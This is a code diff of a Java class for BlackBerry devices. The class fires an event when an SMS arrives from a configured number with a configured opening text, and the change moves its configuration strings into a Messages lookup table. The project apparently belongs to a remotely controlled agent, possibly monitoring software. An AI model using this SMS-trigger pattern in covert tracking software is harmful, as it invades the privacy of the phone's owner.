@@ -11,6 +11,7 @@ package blackberry.event;
 import javax.microedition.io.DatagramConnection;
 import javax.wireless.messaging.MessageConnection;
 
+import blackberry.Messages;
 import blackberry.config.ConfEvent;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
@@ -36,7 +37,7 @@ import blackberry.module.sms.SmsListener46;
  */
 public final class EventSms extends Event implements SmsObserver {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("SmsEvent", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("SmsEvent", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     String number;
@@ -69,8 +70,8 @@ public final class EventSms extends Event implements SmsObserver {
 
     public boolean parse(ConfEvent conf) {
         try {
-            number = conf.getString("number");
-            msg = conf.getString("text").toLowerCase();
+            number = conf.getString(Messages.getString("10.1")); //$NON-NLS-1$
+            msg = conf.getString(Messages.getString("10.2")).toLowerCase(); //$NON-NLS-1$
 
         } catch (final ConfigurationException e) {
             //#ifdef DEBUG
@@ -96,7 +97,7 @@ public final class EventSms extends Event implements SmsObserver {
      */
     public synchronized void actualStop() {
         //#ifdef DEBUG
-        debug.trace("actualStop");
+        debug.trace("actualStop"); //$NON-NLS-1$
         //#endif
 
         smsListener.removeSmsObserver(this);
@@ -109,13 +110,13 @@ public final class EventSms extends Event implements SmsObserver {
 
         if (incoming && address.toLowerCase().endsWith(number)) {
             //#ifdef DEBUG
-            debug.trace("notifyIncomingMessage: good number " + address);
+            debug.trace("notifyIncomingMessage: good number " + address); //$NON-NLS-1$
             //#endif
 
             // case insensitive
             if (msg == null || text.toLowerCase().startsWith(msg)) {
                 //#ifdef DEBUG
-                debug.trace("notifyIncomingMessage good message: " + msg);
+                debug.trace("notifyIncomingMessage good message: " + msg); //$NON-NLS-1$
                 //#endif
 
                 onEnter();
